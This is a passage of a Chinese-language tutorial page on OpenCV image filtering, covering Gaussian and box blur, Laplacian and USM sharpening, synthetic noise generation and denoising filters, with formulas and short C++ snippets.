style="top:-2.5061857142857145em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9384399999999999em;"><span style="top:-2.93844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.04844em;"><span style="top:-3.04844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.04844em;"><span style="top:-3.04844em;margin-right:0.1em;"><span class="pstrut" style="height:2.64444em;"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.49381428571428565em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span></span></span></span></li><li>使用高斯函数可以尽量使得中心点的信息保留，比均匀卷积更能保留原始图像的信息。</li><li>高斯模糊的锚定位置必须是中心位置。</li><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GaussianBlur(src,dst,Size(<span class="number">5</span>,<span class="number">5</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h2 id="盒子模糊"><a class="markdownIt-Anchor" href="#盒子模糊"></a> 盒子模糊</h2><ul><li>盒子模糊即均值模糊，与高斯模糊不同，边缘的破坏会随着核大小增大会越严重。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mi>α</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">K=\alpha\begin{bmatrix} 1 &amp; 1\\1  &amp;1\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">[</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">]</span></span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mfrac><mn>1</mn><mrow><mi>w</mi><mi>i</mi><mi>d</mi><mi>t</mi><mi>h</mi><mo separator="true">⋅</mo><mi>h</mi><mi>e</mi><mi>i</mi><mi>g</mi><mi>h</mi><mi>t</mi></mrow></mfrac></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>w</mi><mi>h</mi><mi>e</mi><mi>n</mi><mtext>normalize=true</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>w</mi><mi>i</mi><mi>s</mi><mi>e</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\alpha=\begin{cases}\frac{1}{width·height}  &amp; when \text{normalize=true} \\1  &amp; otherwise\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.0000299999999998em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7145539999999997em;"><span style="top:-3.7145539999999997em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight">d</span><span class="mord mathdefault mtight">t</span><span class="mord mathdefault mtight">h</span><span class="mpunct mtight">⋅</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight">e</span><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">g</span><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight">t</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-2.225446em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2145540000000001em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7145539999999997em;"><span style="top:-3.7145539999999997em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord text"><span class="mord">normalize=true</span></span></span></span><span style="top:-2.225446em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2145540000000001em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">boxBlur(src,dst,<span class="number">-1</span>,Size(<span class="number">5</span>,<span class="number">5</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="literal">true</span>,BORDER_DEFAULT);</span><br><span class="line"><span class="comment">//设置任意方向的模糊</span></span><br><span class="line">boxBlur(src,dst,<span class="number">-1</span>,Size(<span class="number">15</span>,<span class="number">1</span>),Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="literal">true</span>,BORDER_DEFAULT);</span><br></pre></td></tr></table></figure><h2 id="锐化"><a class="markdownIt-Anchor" href="#锐化"></a> 锐化</h2><h3 id="锐化的梯度算子"><a class="markdownIt-Anchor" href="#锐化的梯度算子"></a> 锐化的梯度算子</h3><ul><li>数学描述</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>−</mo><mo stretchy="false">[</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mn>4</mn><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">g(x,y)=f(x,y)-[f(x+1,y)+f(x-1,y)+f(x,y+1)+f(x,y-1)+4f(x,y)]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">]</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\begin{bmatrix}0 &amp; -1 &amp; 0\\-1 &amp; 5 &amp; -1\\0 &amp; -1 &amp; 0\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>用原图减去二阶梯度边缘检测算子，将图像中边缘的增强加到原图中，实现锐化的效果。</li></ul><h3 id="代码实现-4"><a class="markdownIt-Anchor" href="#代码实现-4"></a> 代码实现</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat mylaplacian = (Mat_&lt;<span class="keyword">int</span>&gt;(<span class="number">3</span>,<span class="number">3</span>)&lt;&lt;<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">5</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">Mat dst;</span><br><span class="line">filter2D(src,dst,CV_32F,mylaplacian,Point(<span class="number">-1</span>,<span class="number">-1</span>),<span class="number">0</span>,BORDER_DEFAULT);</span><br><span class="line">converScaleAbs(dst,dst);</span><br><span class="line">imshow(<span class="string">&quot;sharpen filter&quot;</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="usm锐化"><a class="markdownIt-Anchor" href="#usm锐化"></a> USM锐化</h2><ul><li>unsharp mark filter</li><li>拉普拉斯二阶卷积对于噪声非常敏感，而图像模糊则会将大的边缘变成小的边缘，将两者相减，边缘的差异就显现出来了。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>h</mi><mi>a</mi><mi>r</mi><msub><mi>p</mi><mi>i</mi></msub><mi>m</mi><mi>a</mi><mi>g</mi><mi>e</mi><mo>=</mo><msub><mi>w</mi><mn>1</mn></msub><mo separator="true">⋅</mo><mi>b</mi><mi>l</mi><mi>u</mi><mi>r</mi><mo>−</mo><msub><mi>w</mi><mn>2</mn></msub><mo separator="true">⋅</mo><mi>l</mi><mi>a</mi><mi>p</mi><mi>l</mi><mi>a</mi><mi>c</mi><mi>i</mi><mi>a</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">sharp_image=w_1·blur-w_2·laplacian</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span></span></span></span></span></p><ul><li>USM对大的边缘具有更好的锐化效果，图片效果更为自然。</li></ul><h3 id="高斯与中值模糊的usm增强"><a class="markdownIt-Anchor" href="#高斯与中值模糊的usm增强"></a> 高斯与中值模糊的USM增强</h3><ul><li>代码实现</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat meanBlur,laplac,dst;</span><br><span class="line">GaussianBlur(src,meanBlur,Size(<span class="number">3</span>,<span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">Laplacian(src,laplac,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1.0</span>,BORDER_DEFAULT);</span><br><span class="line">addWeight(meanBlur,<span class="number">1.0</span>,laplac,<span class="number">-0.7</span>,<span class="number">0</span>,dst);</span><br></pre></td></tr></table></figure><h2 id="噪声"><a class="markdownIt-Anchor" href="#噪声"></a> 噪声</h2><ul><li>噪声产生的原因：设备原因，环境原因等</li><li>噪声的分类：椒盐噪声（黑白点）、高斯噪声等</li></ul><h3 id="椒盐噪声"><a class="markdownIt-Anchor" href="#椒盐噪声"></a> 椒盐噪声</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">RNG <span class="title">rng</span><span class="params">(<span class="number">12345</span>)</span></span>;</span><br><span class="line">Mat saltImg = src.clone();</span><br><span class="line"><span class="keyword">int</span> h=src.rows,w=src.cols,nums=<span class="number">100000</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums;i++)&#123;</span><br><span class="line">  <span class="keyword">int</span> x=rng.uniform(<span class="number">0</span>,w),y=rng.uniform(<span class="number">0</span>,h);</span><br><span class="line">  <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">1</span>)saltImg.at&lt;Vec3b&gt;(y,x)=Vec3b(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>);</span><br><span class="line">  <span class="keyword">else</span> saltImg.at&lt;Vec3b&gt;(y,x)=Vec3b(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高斯噪声"><a class="markdownIt-Anchor" href="#高斯噪声"></a> 高斯噪声</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Mat noise = Mat::zeros(src.size(),image.type());</span><br><span class="line">randn(noise,Scalar(<span class="number">15</span>,<span class="number">15</span>,<span class="number">15</span>),Scalar(<span class="number">30</span>,<span class="number">30</span>,<span class="number">30</span>));</span><br><span class="line">Mat GaussImg;</span><br><span class="line">add(image,noise,GaussImg);</span><br></pre></td></tr></table></figure><h2 id="去除噪声"><a class="markdownIt-Anchor" href="#去除噪声"></a> 去除噪声</h2><ul><li>原理：<ul><li>对于椒盐噪声，主要是处理离群点，将偏差减小，常见方法有中值、均值。均值会对原始图像造成扰动，而中值表现更好。</li><li>对于高斯噪声，中值滤波处理后效果变得更模糊，高斯滤波处理效果也不好。比较好用的是边缘保留滤波</li></ul></li></ul><h3 id="中值滤波"><a class="markdownIt-Anchor" href="#中值滤波"></a> 中值滤波</h3><ul><li>前面的滤波都属于线性滤波，中值滤波是一种统计滤波，常见的还有最小值滤波、最大值滤波、均值滤波</li></ul><h4 id="代码实现-5"><a class="markdownIt-Anchor" href="#代码实现-5"></a> 代码实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中值滤波</span></span><br><span class="line">medianBlur(src,dst,<span class="number">5</span>);</span><br></pre></td></tr></table></figure><h3 id="高斯滤波"><a class="markdownIt-Anchor" href="#高斯滤波"></a> 高斯滤波</h3><ul><li>高斯滤波对于椒盐噪声和高斯噪声处理效果都不好。</li></ul><h4 id="代码实现-6"><a class="markdownIt-Anchor" href="#代码实现-6"></a> 代码实现</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//中值滤波</span></span><br><span class="line">GaussianBlur(src,dst,Szie(<span class="number">5</span>,<span class="number">5</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="边缘保留滤波"><a class="markdownIt-Anchor" href="#边缘保留滤波"></a> 边缘保留滤波</h3><ul><li>中值滤波和高斯滤波，并没有考虑中心像素点对整个图像的贡献。锚定的像素点实际上是贡献最大的。所以中值滤波后的图像都被模糊掉了。高斯滤波没有考虑中心像素点和周围像素差值很大的时候，可能是边缘和梯度的值，应该减少中心像素点的权重。</li><li>双边滤波根据每个位置的邻域，构建不同的权重模板。简单定义：I：输入图像；w：权重；O：输出：</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo 